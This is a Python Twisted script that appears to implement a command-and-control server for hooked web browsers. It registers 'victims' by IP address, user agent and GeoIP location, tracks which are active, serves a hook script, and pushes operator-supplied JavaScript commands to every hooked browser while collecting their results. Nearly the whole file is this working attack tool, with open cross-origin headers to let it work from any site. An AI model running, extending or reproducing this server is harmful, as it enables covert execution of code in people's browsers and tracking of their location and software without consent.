#!/usr/bin/python
from twisted.web import server, static, resource
from twisted.internet import reactor
from ua_parser import user_agent_parser
import zlib, json, pygeoip, time, unicodedata, re
class Nodes:
	def __init__(self):
		self.current_request = None
	def openRet(self, request):
		self.current_request = request
	def sendRet(self, ret):
		if self.current_request:
			self.current_request.write(ret)
			self.current_request.finish()
			self.current_request = None
class Victim:
	def __init__(self):
		self.current_request = None
	def openCmd(self, request):
		self.current_request = request
	def sendCmd(self, cmd):
		if self.current_request:
			self.current_request.write(cmd)
			self.current_request.finish()
			self.current_request = None
class liveHosts:
	def __init__(self):
		self.current_request= None
	def openHST(self, request):
		self.current_request = request
	def sendHST(self, hosts):
		if self.current_request:
			self.current_request.write(hosts)
			self.current_request.finish()
			self.current_request = None
clients1 = {}
victims = {}
hosttable = {}

class testRes(resource.Resource):
	isLeaf = True
	numberReq = 0
	clients = {}
	lastRet = {}
	clientNo = 0
	customPayload = {}
	currentPayload = "{\"cmd\":\"alert(\'hello\')\"}"
	currentRet = "not done"
	cmdcnt = 0
	pendingRet = []
	retpointer = 0
	geo = pygeoip.GeoIP('GeoLiteCity.dat')
	def __init__(self):
		resource.Resource.__init__(self)
	def nodeHandler(self, data):
		#ret = str(self.clients[node])
		ret = self.clients.get(data, None)
		return ret
	def getUserHash(self, request):
		ip = request.getClientIP()
		userstr = ip + " " + request.getHeader("User-Agent")
		userhash = str(zlib.crc32(zlib.compress(userstr)))
		if (userhash[:1] == "-"):
			userhash = userhash[1:]
		return userhash
	def trackCOMM(self, request):
		uh = self.getUserHash(request)
		record = json.loads(self.clients[uh])
		record['lastcomm'] = int(time.time())
		self.clients[uh] = json.dumps(record)
	def listActive(self):
		activeclients = {}
		for client in self.clients:
			tmpClient = json.loads(self.clients[client])
			if(int(tmpClient['lastcomm']) > int(time.time()) - 900):
				activeclients[client] = self.clients[client]
		return json.dumps(activeclients)
	def sendHSTB(self, data):
		for h in hosttable:
			try:
				hosttable[h].sendHST(data)
			except:
				pass
	def render_GET(self, request):
		#print request.getHeader("User-Agent")
		request.setHeader("content-type", "application/json")
		self.setHeaders(request)
		if(str(request)[6:9] == 'cmd'):
			#self.trackCOMM(self, request)
			avictim = request.args['id'][0]
			if (avictim not in self.clients):
				rereg = {}
				rereg['cmd'] = "rR();"
				return json.dumps(rereg)
			if(avictim not in victims):
				victims[avictim] = Victim()
			victims[avictim].openCmd(request)
			self.trackCOMM(request)
			return server.NOT_DONE_YET
		if(str(request)[6:9] == 'new'):
			clients1[len(clients1)] = Nodes()
			return json.dumps({"id": len(clients1)-1})

		if(str(request)[6:9] == 'ret'):
			if self.pendingRet:
				mcret = self.pendingRet[0]
				self.pendingRet.pop(0)
				return mcret
			else:
				aclient = int(request.args['id'][0])
				if (aclient not in clients1):
					clients1[aclient] = Nodes()
				clients1[aclient].openRet(request)
				return server.NOT_DONE_YET
		if(str(request)[6:9] == 'lst'):
			aclient = int(request.args['id'][0])
			if(aclient not in hosttable):
				hosttable[aclient] = liveHosts()
			hosttable[aclient].openHST(request)
			return server.NOT_DONE_YET
		if (str(request)[6:9] == "reg"):
			return self.regHandler(request)
		if (str(request)[6:9] == "xjs"):
			fileOb = open("x.js", "r")
			return fileOb.read()
		return "200"
	def convertUnicode(self, text):
		if(type(text) is unicode):
			return unicodedata.normalize('NFKD', text).encode('ascii','ignore')
		else:
			return str(text)
	def osProfile(self, ua):
		profile = user_agent_parser.Parse(ua)
		condensed_profile = {}
		condensed_profile['os'] = str(profile['os']['family'])
		condensed_profile['browser'] = str(profile['user_agent']['family'])
		condensed_profile['browser_ver'] = str(profile['user_agent']['major']) + "." + str(profile['user_agent']['minor']) + "." + str(profile['user_agent']['patch'])
		return condensed_profile
	def regHandler(self, request):
		self.numberReq += 1
		ip = request.getClientIP()
		userhash = self.getUserHash(request)
		gdata = self.geo.record_by_addr(ip)
		victims[userhash] = Victim()
		client = {}
		client['userhash'] = userhash
		client['ip'] = ip
		client['ua'] = str(request.getHeader("User-Agent")).translate(None, ';')
		client['country'] = gdata['country_code'] #todo: geoip
		client['city'] = self.convertUnicode(gdata['city'])
		client['lastcomm'] = str(int(time.time())) #dunno about this
		tmpClient = client
		client = dict(tmpClient, **self.osProfile(tmpClient['ua']))
		self.clients[userhash] = json.dumps(client)
		self.sendHSTB(self.listActive())
		return str(self.clients[userhash])
		#output = ip + "\n" + userhash
		#return output		
#return "I am request #" + str(self.numberReq) + "\n"
	def setHeaders(self, request):
		request.setHeader('Access-Control-Allow-Origin','*')
		request.setHeader('Access-Control-Allow-Methods','GET, POST')
		request.setHeader('Access-Control-Allow-Headers','x-prototype-version,x-requested-with')
		request.setHeader('Access-Control-Max-Age',2520)
		request.setHeader('Content-type','application/json')
	def render_POST(self, request):
		self.setHeaders(request)
		opt = self.convertUnicode(request)[7:10]
		data = self.convertUnicode(request.args['data'][0])
		print data
		if (opt == "cmd"):
			return self.cmdHandler(data)
		if (opt == "ret"):
			return self.retHandler(data)
		if (opt == "nde"):
			return self.nodeHandler(data)
		if (opt == "rer"):
			updateID = request.args['id'][0]
			self.clients[updateID] = data
			self.trackCOMM(request)
			self.sendHSTB(self.listActive())
		return "nope"
	def cmdHandler(self, data):
		sentOb = json.loads(data)
		cmdOb = {}
		self.cmdcnt += 1
		cmdOb['id'] = self.cmdcnt
		cmdOb['time'] = int(time.time())
		if (sentOb['userhash'] != ""):
			cmdOb['userhash'] = sentOb['userhash']
		else:
			cmdOb['userhash'] = "0"
		cmdOb['cmd'] = str(sentOb['cmd'])
		cmdstring =json.dumps(cmdOb)
		self.currentPayload = cmdstring
		
		for v in victims:
			try:
				victims[v].sendCmd(cmdstring)
			except:
				pass
		
		return "Done."
	def retHandler(self, data):
		self.cmdcnt += 1
		tmpData = json.loads(data)
		tmpData['retID'] = self.cmdcnt
		tmpData['time'] = int(time.time())
		self.lastRet[tmpData['userhash']] = tmpData['data']
		newData = json.dumps(tmpData)
		print "sending: " + newData
		self.currentRet = newData
		self.pendingRet.append(newData)
		for c in clients1:
			try:
				clients1[c].sendRet(newData)
			except:
				pass
			
		return "200"

#	def regHandler(self, request):
#		return "not done"	
root = testRes()
root.putChild("ajax", testRes())
reactor.listenTCP(8080, server.Site(root))
reactor.run()
